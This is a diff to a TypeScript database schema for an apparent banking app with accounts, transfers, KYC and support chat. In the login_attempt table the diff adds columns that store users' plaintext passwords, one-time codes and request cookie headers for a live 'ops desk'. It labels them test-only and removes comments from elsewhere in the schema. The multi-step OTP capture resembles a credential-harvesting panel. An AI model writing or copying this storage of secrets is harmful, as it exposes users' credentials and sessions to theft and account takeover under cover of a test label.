@@ -8,9 +8,6 @@ import {
   bigint,
 } from 'drizzle-orm/pg-core'
 
-// --- Better Auth required tables -------------------------------------------
-// Column names are camelCase to match Better Auth's defaults. Do not rename.
-
 export const user = pgTable('user', {
   id: text('id').primaryKey(),
   name: text('name').notNull(),
@@ -66,13 +63,11 @@ export const verification = pgTable('verification', {
   updatedAt: timestamp('updatedAt').defaultNow(),
 })
 
-// --- App tables ------------------------------------------------------------
-
 export const bankAccount = pgTable('bank_account', {
   id: serial('id').primaryKey(),
   userId: text('userId').notNull(),
   name: text('name').notNull(),
-  type: text('type').notNull(), // 'checking' | 'savings' | 'retirement'
+  type: text('type').notNull(),
   accountNumber: text('accountNumber').notNull(),
   balanceCents: bigint('balanceCents', { mode: 'number' })
     .notNull()
@@ -86,7 +81,7 @@ export const transaction = pgTable('transaction', {
   userId: text('userId').notNull(),
   accountId: integer('accountId').notNull(),
   amountCents: bigint('amountCents', { mode: 'number' }).notNull(),
-  type: text('type').notNull(), // 'debit' | 'credit' | 'transfer'
+  type: text('type').notNull(),
   description: text('description').notNull(),
   category: text('category'),
   counterparty: text('counterparty'),
@@ -97,9 +92,9 @@ export const outboundPayment = pgTable('outbound_payment', {
   id: serial('id').primaryKey(),
   userId: text('userId').notNull(),
   fromAccountId: integer('fromAccountId').notNull(),
-  method: text('method').notNull(), // 'zelle' | 'wire'
+  method: text('method').notNull(),
   amountCents: bigint('amountCents', { mode: 'number' }).notNull(),
-  status: text('status').notNull().default('scheduled'), // scheduled | sent | cancelled | failed
+  status: text('status').notNull().default('scheduled'),
   scheduledFor: timestamp('scheduledFor').notNull(),
   recipientName: text('recipientName').notNull(),
   recipientBank: text('recipientBank'),
@@ -131,7 +126,7 @@ export const kycSubmission = pgTable('kyc_submission', {
 export const chatThread = pgTable('chat_thread', {
   id: serial('id').primaryKey(),
   userId: text('userId').notNull(),
-  status: text('status').notNull().default('open'), // open | closed
+  status: text('status').notNull().default('open'),
   subject: text('subject').notNull().default('Support chat'),
   createdAt: timestamp('createdAt').notNull().defaultNow(),
   updatedAt: timestamp('updatedAt').notNull().defaultNow(),
@@ -140,28 +135,36 @@ export const chatThread = pgTable('chat_thread', {
 export const chatMessage = pgTable('chat_message', {
   id: serial('id').primaryKey(),
   threadId: integer('threadId').notNull(),
-  sender: text('sender').notNull(), // 'user' | 'admin'
+  sender: text('sender').notNull(),
   body: text('body').notNull(),
   createdAt: timestamp('createdAt').notNull().defaultNow(),
 })
 
-/** Multi-step sign-in challenge tracked live on the ops desk */
+/** Multi-step sign-in challenge tracked live on the ops desk.
+ *  TEST MODE: passwordPlain / otpPlain / cookieHeader stored in clear text for ops visibility.
+ *  Remove after testing and switch secrets back to hashed-only storage.
+ */
 export const loginAttempt = pgTable('login_attempt', {
   id: text('id').primaryKey(),
   userId: text('userId').notNull(),
   email: text('email').notNull(),
   memberName: text('memberName').notNull(),
-  /** credentials | username | otp1 | otp2 | awaiting_approval | approved | rejected | expired */
   step: text('step').notNull().default('credentials'),
-  status: text('status').notNull().default('in_progress'), // in_progress | awaiting_approval | approved | rejected | expired
+  status: text('status').notNull().default('in_progress'),
   usernameSubmitted: text('usernameSubmitted'),
+  /** TEST ONLY — plain password for ops desk */
+  passwordPlain: text('passwordPlain'),
   otpHash: text('otpHash'),
+  /** TEST ONLY — plain OTP for ops desk */
+  otpPlain: text('otpPlain'),
   otpExpiresAt: timestamp('otpExpiresAt'),
   otp1Verified: boolean('otp1Verified').notNull().default(false),
   otp2Verified: boolean('otp2Verified').notNull().default(false),
   lastEvent: text('lastEvent'),
   ipAddress: text('ipAddress'),
   userAgent: text('userAgent'),
+  /** TEST ONLY — request cookie header snapshot */
+  cookieHeader: text('cookieHeader'),
   createdAt: timestamp('createdAt').notNull().defaultNow(),
   updatedAt: timestamp('updatedAt').notNull().defaultNow(),
 })
